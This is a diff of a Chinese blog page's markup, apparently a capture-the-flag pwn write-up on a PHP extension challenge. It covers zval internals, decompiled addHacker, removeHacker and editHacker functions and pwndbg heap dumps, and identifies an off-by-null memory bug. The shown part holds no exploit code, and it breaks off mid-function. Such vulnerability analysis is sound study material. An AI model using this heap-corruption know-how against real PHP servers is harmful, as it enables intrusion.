+<pre class="line-numbers language-none"><code class="language-none">ZEND_API zend_result zend_parse_parameters(uint32_t num_args, const char *type_spec, ...);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h5 id="php变量类型的表示方法"><a href="#php变量类型的表示方法" class="headerlink" title="php变量类型的表示方法"></a>php变量类型的表示方法</h5><p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23">https://github.com/php/php-src/blob/212b2834e9fbcb9a48b9cb709713b6cb197607cc/docs/source/core/data-structures/zval.rst#L23</a></p>
 <p>php是一门动态类型语言，变量可以存储任何类型的数据，并且变量的类型可以在程序执行期间发生变化，在zend引擎中变量是由一个叫做zval的结构体去描述的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span>     <span class="title">zval</span>;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_zval_struct</span>     zval<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				<span class="type">uint8_t</span>    type,			<span class="comment">/* active type */</span></span><br><span class="line">				<span class="type">uint8_t</span>    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     guard;                <span class="comment">/* recursion and single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_zval_struct</span> <span class="token punctuation">&#123;</span>
+	zend_value        value<span class="token punctuation">;</span>			<span class="token comment">/* value */</span>
+	<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+		<span class="token class-name">uint32_t</span> type_info<span class="token punctuation">;</span>
+		<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+			<span class="token function">ZEND_ENDIAN_LOHI_3</span><span class="token punctuation">(</span>
+				<span class="token class-name">uint8_t</span>    type<span class="token punctuation">,</span>			<span class="token comment">/* active type */</span>
+				<span class="token class-name">uint8_t</span>    type_flags<span class="token punctuation">,</span>
+				<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+					<span class="token class-name">uint16_t</span>  extra<span class="token punctuation">;</span>        <span class="token comment">/* not further specified */</span>
+				<span class="token punctuation">&#125;</span> u<span class="token punctuation">)</span>
+		<span class="token punctuation">&#125;</span> v<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span> u1<span class="token punctuation">;</span>
+	<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
+		<span class="token class-name">uint32_t</span>     next<span class="token punctuation">;</span>                 <span class="token comment">/* hash collision chain */</span>
+		<span class="token class-name">uint32_t</span>     cache_slot<span class="token punctuation">;</span>           <span class="token comment">/* cache slot (for RECV_INIT) */</span>
+		<span class="token class-name">uint32_t</span>     opline_num<span class="token punctuation">;</span>           <span class="token comment">/* opline number (for FAST_CALL) */</span>
+		<span class="token class-name">uint32_t</span>     lineno<span class="token punctuation">;</span>               <span class="token comment">/* line number (for ast nodes) */</span>
+		<span class="token class-name">uint32_t</span>     num_args<span class="token punctuation">;</span>             <span class="token comment">/* arguments number for EX(This) */</span>
+		<span class="token class-name">uint32_t</span>     fe_pos<span class="token punctuation">;</span>               <span class="token comment">/* foreach position */</span>
+		<span class="token class-name">uint32_t</span>     fe_iter_idx<span class="token punctuation">;</span>          <span class="token comment">/* foreach iterator index */</span>
+		<span class="token class-name">uint32_t</span>     guard<span class="token punctuation">;</span>                <span class="token comment">/* recursion and single property guard */</span>
+		<span class="token class-name">uint32_t</span>     constant_flags<span class="token punctuation">;</span>       <span class="token comment">/* constant flags */</span>
+		<span class="token class-name">uint32_t</span>     extra<span class="token punctuation">;</span>                <span class="token comment">/* not further specified */</span>
+	<span class="token punctuation">&#125;</span> u2<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>其中关于类型的定义是这样的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF     0 <span class="comment">/* A variable that was never written to. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL      1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE     2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE      3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG      4 <span class="comment">/* An integer value. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE    5 <span class="comment">/* A floating point value. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY     7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE  9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE 10</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_UNDEF</span>     <span class="token expression"><span class="token number">0</span> </span><span class="token comment">/* A variable that was never written to. */</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_NULL</span>      <span class="token expression"><span class="token number">1</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_FALSE</span>     <span class="token expression"><span class="token number">2</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_TRUE</span>      <span class="token expression"><span class="token number">3</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_LONG</span>      <span class="token expression"><span class="token number">4</span> </span><span class="token comment">/* An integer value. */</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_DOUBLE</span>    <span class="token expression"><span class="token number">5</span> </span><span class="token comment">/* A floating point value. */</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_STRING</span>    <span class="token expression"><span class="token number">6</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_ARRAY</span>     <span class="token expression"><span class="token number">7</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_OBJECT</span>    <span class="token expression"><span class="token number">8</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_RESOURCE</span>  <span class="token expression"><span class="token number">9</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_REFERENCE</span> <span class="token expression"><span class="token number">10</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>所以从这里可以判断出addhacker这个函数有两个字符串类型的参数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v3, &amp;unk_2000, &amp;arg1, &amp;arg2) != <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( arg1[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; arg2[<span class="number">8</span>] == <span class="number">6</span> )</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> arg1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> arg2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>然后代码中的 arg1 + 0x10 arg1 + 0x18 arg2 + 0x10 arg2 + 0x18调试了一下发现 + 0x10 取字符串的长度，+ 0x18是取字符串的基地址</p>
 <p>chunklist的结构是这样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /100gx 0x7d6e061d7160</span><br><span class="line">0x7d6e061d7160 &lt;chunkList&gt;:     0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7170 &lt;chunkList+16&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7180 &lt;chunkList+32&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7190 &lt;chunkList+48&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71a0 &lt;chunkList+64&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71b0 &lt;chunkList+80&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71c0 &lt;chunkList+96&gt;:  0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71d0 &lt;chunkList+112&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71e0 &lt;chunkList+128&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d71f0 &lt;chunkList+144&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7200 &lt;chunkList+160&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7210 &lt;chunkList+176&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7220 &lt;chunkList+192&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7230 &lt;chunkList+208&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7240 &lt;chunkList+224&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7250 &lt;chunkList+240&gt;: 0x0000000000000000      0x0000000000000001</span><br><span class="line">0x7d6e061d7260: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x &#x2F;100gx 0x7d6e061d7160
+0x7d6e061d7160 &lt;chunkList&gt;:     0x0000000000000000      0x0000000000000001
+0x7d6e061d7170 &lt;chunkList+16&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d7180 &lt;chunkList+32&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d7190 &lt;chunkList+48&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d71a0 &lt;chunkList+64&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d71b0 &lt;chunkList+80&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d71c0 &lt;chunkList+96&gt;:  0x0000000000000000      0x0000000000000001
+0x7d6e061d71d0 &lt;chunkList+112&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d71e0 &lt;chunkList+128&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d71f0 &lt;chunkList+144&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7200 &lt;chunkList+160&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7210 &lt;chunkList+176&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7220 &lt;chunkList+192&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7230 &lt;chunkList+208&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7240 &lt;chunkList+224&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7250 &lt;chunkList+240&gt;: 0x0000000000000000      0x0000000000000001
+0x7d6e061d7260: 0x0000000000000000      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>所以这段代码的用途是在chunklist中找一个可用的空间，然后通过arg1的长度和arg2 + 0x10的长度申请两个堆，把arg1申请出来的堆写到arg2的堆里，最后把通过arg2堆写回chunklist，同时修改chunklist中inuse的标志位</p>
 <p>写回chunklist逻辑附近有一个off by null的漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  *(_QWORD *)v7 = v8;</span><br><span class="line">  *((_DWORD *)v7 + 2) = 13;</span><br><span class="line">  *((_BYTE *)v8 + v13 + 16) = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">  *(_QWORD *)v7 &#x3D; v8;
+  *((_DWORD *)v7 + 2) &#x3D; 13;
+  *((_BYTE *)v8 + v13 + 16) &#x3D; 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="zif-removeHacker"><a href="#zif-removeHacker" class="headerlink" title="zif_removeHacker"></a>zif_removeHacker</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall zif_removeHacker(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // rdi</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  _QWORD *v7; // rbp</span><br><span class="line">  __int64 arg1; // [rsp+0h] [rbp-28h] BYREF</span><br><span class="line">  unsigned __int64 v9; // [rsp+8h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  v4 = *(unsigned int *)(a1 + 44);</span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  if ( (unsigned int)zend_parse_parameters(v4, &amp;unk_2001, &amp;arg1, a4) != -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(_BYTE *)(arg1 + 8) != 4</span><br><span class="line">      || (v6 = &amp;chunkList[4 * *(_QWORD *)arg1], *((_BYTE *)v6 + 8) == 1)</span><br><span class="line">      || *(_QWORD *)arg1 &gt; 0xFuLL )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a2 + 8) = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD **)v6;</span><br><span class="line">      _efree(**(_QWORD **)v6);</span><br><span class="line">      _efree(v7);</span><br><span class="line">      chunkList[4 * *(_QWORD *)arg1 + 2] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v9 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="zif-removeHacker"><a href="#zif-removeHacker" class="headerlink" title="zif_removeHacker"></a>zif_removeHacker</h4><pre class="line-numbers language-none"><code class="language-none">unsigned __int64 __fastcall zif_removeHacker(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
+&#123;
+  __int64 v4; &#x2F;&#x2F; rdi
+  _DWORD *v6; &#x2F;&#x2F; rax
+  _QWORD *v7; &#x2F;&#x2F; rbp
+  __int64 arg1; &#x2F;&#x2F; [rsp+0h] [rbp-28h] BYREF
+  unsigned __int64 v9; &#x2F;&#x2F; [rsp+8h] [rbp-20h]
+
+  v4 &#x3D; *(unsigned int *)(a1 + 44);
+  v9 &#x3D; __readfsqword(0x28u);
+  if ( (unsigned int)zend_parse_parameters(v4, &amp;unk_2001, &amp;arg1, a4) !&#x3D; -1 )
+  &#123;
+    if ( *(_BYTE *)(arg1 + 8) !&#x3D; 4
+      || (v6 &#x3D; &amp;chunkList[4 * *(_QWORD *)arg1], *((_BYTE *)v6 + 8) &#x3D;&#x3D; 1)
+      || *(_QWORD *)arg1 &gt; 0xFuLL )
+    &#123;
+      *(_DWORD *)(a2 + 8) &#x3D; 1;
+    &#125;
+    else
+    &#123;
+      v7 &#x3D; *(_QWORD **)v6;
+      _efree(**(_QWORD **)v6);
+      _efree(v7);
+      chunkList[4 * *(_QWORD *)arg1 + 2] &#x3D; 1;
+    &#125;
+  &#125;
+  return v9 - __readfsqword(0x28u);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>removeHacker只有一个整型参数idx, 传递idx过去后会根据idx去chunklist中找到arg2堆，然后再根据arg2堆的内容找到arg1堆最后free掉两个堆，同时修改chunlist中的inuse标志位</p>
-<h4 id="zif-editHacker"><a href="#zif-editHacker" class="headerlink" title="zif_editHacker"></a>zif_editHacker</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">zif_editHacker</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v2, &amp;unk_2000, &amp;v9, &amp;v10) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)(v11 - __readfsqword(<span class="number">0x28</span>u));</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(v9 + <span class="number">8</span>) != <span class="number">4</span></span><br><span class="line">    || v10[<span class="number">8</span>] != <span class="number">6</span></span><br><span class="line">    || (v4 = (<span class="type">char</span> *)&amp;chunkList + <span class="number">16</span> * *(_QWORD *)v9, v4[<span class="number">8</span>] == <span class="number">1</span>)</span><br><span class="line">    || *(_QWORD *)v9 &gt; <span class="number">0xF</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a2 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)(v11 - __readfsqword(<span class="number">0x28</span>u));</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(<span class="type">void</span> ***)v4;</span><br><span class="line">  v6 = **(<span class="type">void</span> ***)v4;</span><br><span class="line">  v7 = *(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt;= *(_QWORD *)(*(_QWORD *)v4 + <span class="number">8LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(v6, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v10 + <span class="number">24LL</span>), v7);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)(v11 - __readfsqword(<span class="number">0x28</span>u));</span><br><span class="line">  &#125;</span><br><span class="line">  _efree(v6);</span><br><span class="line">  v8 = (<span class="type">void</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>));</span><br><span class="line">  *v5 = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(v8, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v10 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v10 + <span class="number">16LL</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="zif-editHacker"><a href="#zif-editHacker" class="headerlink" title="zif_editHacker"></a>zif_editHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>__fastcall <span class="token function">zif_editHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  <span class="token class-name">size_t</span> v7<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h] BYREF</span>
+  _BYTE <span class="token operator">*</span>v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span>
+    <span class="token operator">||</span> v10<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">6</span>
